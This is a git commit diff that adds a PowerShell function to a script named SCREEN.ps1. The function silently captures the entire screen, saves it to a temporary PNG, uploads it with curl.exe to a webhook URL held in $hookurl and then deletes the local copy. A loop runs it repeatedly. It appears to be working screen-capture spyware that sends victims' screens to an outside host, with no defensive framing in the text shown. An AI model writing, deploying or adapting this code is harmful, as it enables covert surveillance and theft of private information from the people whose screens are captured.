3c8639e7647718ef3c2d8860a142497febea431b
Alyoutubers <142686309+Alyoutubers@users.noreply.github.com>
2024-02-05 23:56:27 +0100

    Update SCREEN.ps1

--- SCREEN.ps1
+++ SCREEN.ps1
@@ -26,7 +26,24 @@ Function TakeAndSendScreenshot {
     Start-Sleep 1
     Remove-Item -Path $filett
 }
-
+Function TakeAndSendScreenshot {
+    $Filett = "$env:temp\SC.png"
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-type -AssemblyName System.Drawing
+    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+    $Width = $Screen.Width
+    $Height = $Screen.Height
+    $Left = $Screen.Left
+    $Top = $Screen.Top
+    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
+    Start-Sleep 1
+    curl.exe -F "file1=@$filett" $hookurl
+    Start-Sleep 1
+    Remove-Item -Path $filett
+}
 # Prendre et envoyer 2 captures d'écran
 for ($i = 0; $i -lt $a; $i++) {
     TakeAndSendScreenshot
